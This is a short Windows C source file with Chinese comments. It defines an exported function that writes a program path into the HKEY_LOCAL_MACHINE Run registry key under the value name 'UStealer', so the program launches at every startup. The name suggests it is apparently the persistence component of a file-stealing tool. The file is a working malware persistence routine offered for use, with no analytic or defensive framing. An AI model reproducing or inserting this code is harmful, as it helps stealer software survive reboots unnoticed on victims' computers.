#include<stdio.h>
#include<windows.h>

extern "C"{
  void HKRunator(char *programName);
}

void HKRunator(char *programName)   //程序名称（**全路径**）
{
	HKEY hkey = NULL;
	DWORD rc;

	rc = RegCreateKeyEx(HKEY_LOCAL_MACHINE,                      //创建一个注册表项，如果有则打开该注册表项
		"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
		0,
		NULL,
		REG_OPTION_NON_VOLATILE,
		KEY_WOW64_64KEY | KEY_ALL_ACCESS,    //部分windows系统编译该行会报错， 删掉 “”KEY_WOW64_64KEY | “” 即可
		NULL,
		&hkey,
		NULL);

	if (rc == ERROR_SUCCESS)   
	{
		rc = RegSetValueEx(hkey, 
			"UStealer",
			0,
			REG_SZ,
			(const BYTE *)programName,
			strlen(programName));
		if (rc == ERROR_SUCCESS)
		{
			RegCloseKey(hkey);
		}
	}
}
